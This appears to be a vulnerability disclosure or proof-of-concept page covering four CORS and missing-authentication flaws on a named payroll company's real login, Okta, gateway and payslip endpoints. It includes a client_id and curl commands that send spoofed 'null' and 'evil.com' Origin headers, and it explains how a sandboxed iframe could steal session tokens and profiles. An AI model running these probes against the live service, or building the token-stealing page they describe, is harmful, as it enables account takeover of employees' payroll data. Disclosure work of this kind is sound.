PoC 1 — Auth0 Cross-Origin Authentication Endpoint HIGH

Endpoint

POST https://login.payfit.com/co/authenticate

Vulnerability

Reflects Origin: null with Access-Control-Allow-Credentials: true. A sandboxed iframe sends Origin: null — so ANY website can steal authentication tokens from a victim with an active PayFit session.

Why null origin works from here

Sandboxed iframes (sandbox="allow-scripts") always send Origin: null. This page's origin doesn't matter at all.

PoC 2 — Okta Userinfo Endpoint CRITICAL

Endpoint

GET https://payfit.okta.com/oauth2/v1/userinfo

Vulnerability

Okta's userinfo endpoint for PayFit reflects ANY origin including null with Access-Control-Allow-Credentials: true. An attacker on any page can steal a victim's Okta profile (name, email, admin group memberships) when the victim has an active Okta session.

PoC 3 — CAPIG Reflects Arbitrary Origin HIGH

Endpoint

POST https://capig.payfit.com/capi/test/events

Vulnerability

Unlike api.payfit.com which restricts to *.payfit.com subdomains, the CAPIG gateway reflects any origin whatsoever — including evil.com and null — with credentials. This request is made directly from this page (agentprime-bob.github.io).

PoC 4 — Unauthenticated Payslip Endpoint HIGH

Endpoint

POST https://api.payfit.com/qrcode/payslip/decrypt

Vulnerability

Every other endpoint on api.payfit.com returns 403 RBAC: access denied. This endpoint returns 400 — meaning it processes the request without any authentication. No rate limiting observed over 100 consecutive requests.

Curl Evidence (copy-paste reproducible)

# PoC 1 — Auth0 null origin reflects credentials=true
curl -s -D - -X POST https://login.payfit.com/co/authenticate \
  -H "Origin: null" \
  -H "Content-Type: application/json" \
  -d '{"client_id":"6cniDP8MgkConfXsyoKpF80aYtpVFtSY","credential_type":"http://auth0.com/oauth/grant-type/password-realm","username":"test@test.com","password":"test","realm":"PayFit-Individual-Database"}' \
  2>/dev/null | grep -E "HTTP|access-control|login_ticket"

# PoC 2 — Okta reflects null origin with credentials
curl -s -D - https://payfit.okta.com/oauth2/v1/userinfo \
  -H "Origin: null" 2>/dev/null | grep -i "access-control"

# PoC 3 — CAPIG reflects any origin (evil.com)
curl -s -D - -X POST https://capig.payfit.com/capi/test/events \
  -H "Origin: https://evil.com" \
  -H "Content-Type: application/json" \
  -d '{"dataType":"test"}' 2>/dev/null | grep -i "access-control"

# PoC 4 — Payslip endpoint is unauthenticated (returns 400 not 403)
